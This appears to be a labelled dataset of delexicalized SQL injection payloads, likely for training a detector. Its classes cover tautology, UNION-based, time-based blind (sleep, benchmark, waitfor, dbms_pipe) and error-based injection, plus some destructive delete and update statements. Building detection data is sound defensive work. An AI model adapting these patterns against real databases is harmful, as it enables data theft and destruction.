payload_delex,type_id
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__",2
__INT__ ) ) waitfor __IDENT__ __IDENT__,6
"__INT__ ) where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
-__INT__' ) order by __INT__ --,0
and [__IDENT__] = [__IDENT__] and [__IDENT__],2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__"" or __INT__ = __INT__#",2
__INT__ % __STR__ % __STR__,2
"__INT__' __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ )",3
__INT__ ) ) ) and __INT__ = __INT__,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
"-__INT__' ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ like '__IDENT__",2
-__INT__ ) or __INT__ = __INT__ and ( __INT__ = __INT__,2
"__INT__ ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ % ) ) and sleep ( __INT__ ) and ( ( % __STR__,6
delete from __IDENT__,2
"__INT__ , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__' or __STR__ < @ union select __INT__ , __IDENT__ ( ) -- __INT__",7
__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__ --,2
"__INT__"" ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
-5470__STR__oeam__STR__oeam,2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
-__INT__ % __STR__ % __STR__,2
"__INT__"" where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
", ( select [__IDENT__] from ( select __IDENT__ ( [__IDENT__] , [__IDENT__] ) > ( select __IDENT__ ( * ) , concat ( __STR__ , ( select ( elt ( [__IDENT__] = [__IDENT__] , __INT__ ) ) ) , __STR__ , __IDENT__ ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from ( select [__IDENT__] union select [__IDENT__] union select [__IDENT__] union select [__IDENT__] ) __IDENT__ group by __IDENT__ ) ) __IDENT__ ) , ( select [__IDENT__] from ( select __IDENT__ ( [__IDENT__] , [__IDENT__] ) > ( select __IDENT__ ( * ) , concat ( __STR__ , ( [__IDENT__] ) , __STR__ , __IDENT__ ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from ( select [__IDENT__] union select [__IDENT__] union select [__IDENT__] union select [__IDENT__] ) __IDENT__ group by __IDENT__ ) ) __IDENT__ )",7
-4541__STR__xfex__STR__xfex,2
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__"" ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-7060__STR__twpr__STR__twpr,2
"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ --",7
"-__INT__ % ' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ % "" ) and __INT__ = __INT__#",2
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"__INT__ % "" ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ rlike sleep ( __INT__ ) and __IDENT__,6
__INT__ __INT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ __IDENT__ = __INT__ __INT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ __INT__ __INT__ __INT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ 02_01 __INT__ __IDENT__ asc __INT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ __IDENT__ __INT__ __IDENT__ __INT__,0
"-__INT__"" ) or __INT__ = __INT__#",2
__IDENT__ __IDENT__ __IDENT__ __IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__,0
-__INT__ ) or __INT__ = __INT__#,2
__INT__' in __IDENT__ __IDENT__ ) and __INT__ = __INT__,2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and __IDENT__",3
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ % ' order by __INT__#,0
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"-__INT__ % "" or __INT__ = __INT__ --",2
__INT__ ) ) ) waitfor __IDENT__ __TIME__ and ( ( ( __IDENT__,6
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__ % ' union all select __INT__ , __INT__ --",7
-__INT__ % __STR__ % __STR__,2
__INT__ or sleep ( __INT__ ) and __IDENT__,6
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
1__STR__qqam__STR__qqam,2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__' or __INT__ = __INT__ --,2
__INT__ ) ) ) and sleep ( __INT__ ) and ( ( ( __INT__ = __INT__,6
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( __IDENT__",3
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
-__INT__' ) or __INT__ = __INT__#,2
__INT__ ) waitfor __IDENT__ __TIME__ and ( __IDENT__,6
1__STR__lxxt__STR__lxxt,2
"__INT__"" ) and __INT__ = __INT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
"-__INT__"" ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"-__INT__"" ) ) ) union all select __INT__ , __INT__ --",7
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null --",7
__INT__ % __STR__ % __STR__,2
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
-__INT__' ) or ( __INT__ = __INT__ ) * __INT__,2
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and __IDENT__",6
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__"" and __INT__ = __INT__",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
"-__INT__"" ) ) ) union all select __INT__#",7
-__INT__ ) or __INT__ = __INT__ --,2
"__INT__' where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
delete from __IDENT__ where __IDENT__ = __STR__,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",0
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ % ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( % __STR__",6
-__INT__' ) ) ) order by __INT__ --,0
"__INT__ % ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( ( % __STR__",3
"1__STR__dpce' from dual where __INT__ = __INT__ union all select null , null , null , null , null , null --",7
"__INT__ % and elt ( __INT__ = __INT__ , __INT__ ) and % __STR__",2
__INT__ % ' ) and sleep ( __INT__ ) #,6
"__INT__' where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where outer = __IDENT__",2
__INT__' ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"-__INT__"" or __INT__ = __INT__ --",2
"-__INT__' ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
-__INT__' order by __INT__ --,0
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
"-__INT__ ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = '__IDENT__",2
"-__INT__' ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
end and __STR__ = '__IDENT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
waitfor __IDENT__ __STR__ and __STR__ like '__IDENT__,6
"__INT__ union all select null , null , null , null , null , null#",7
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
__INT__ rlike sleep ( __INT__ ) and __IDENT__,6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__' and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__"" ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"-__INT__ ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ ) ) ) or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( __IDENT__",6
-7793__STR__lias__STR__lias,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__ ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
__INT__' ) ) ) and __INT__ = __INT__ --,2
end if,0
"__INT__ % __IDENT__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( % __STR__",6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__"" union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"-__INT__ ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' ) ) or __INT__ = __INT__,2
__INT__ ) ) rlike sleep ( __INT__ ) and ( ( __IDENT__,6
__IDENT__-__IDENT__@__IDENT__,0
"__INT__ % or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and % __STR__",6
"__INT__"" ) ) and __INT__ = __INT__",2
-__INT__ % ' ) ) ) or __INT__ = __INT__,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
-__INT__' or __INT__ = __INT__#,2
"__INT__"" where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) -- __IDENT__",6
-4012__STR__ccfn__STR__ccfn,2
__INT__' rlike sleep ( __INT__ ) #,6
delete from __IDENT__,2
delete from __IDENT__,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
or true --,2
"__INT__"" and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"-__INT__ % "" or __INT__ = __INT__ --",2
"or benchmark ( __INT__ , __IDENT__ ( __INT__ ) ) #",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__' , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",6
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __INT__ = __INT__",2
-__INT__ % ' or __INT__ = __INT__,2
__IDENT__-__IDENT__@__IDENT__,0
1__STR__kyxl__STR__kyxl,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__' ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",6
__INT__ ) ) ) order by __INT__ --,0
"-__INT__' ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
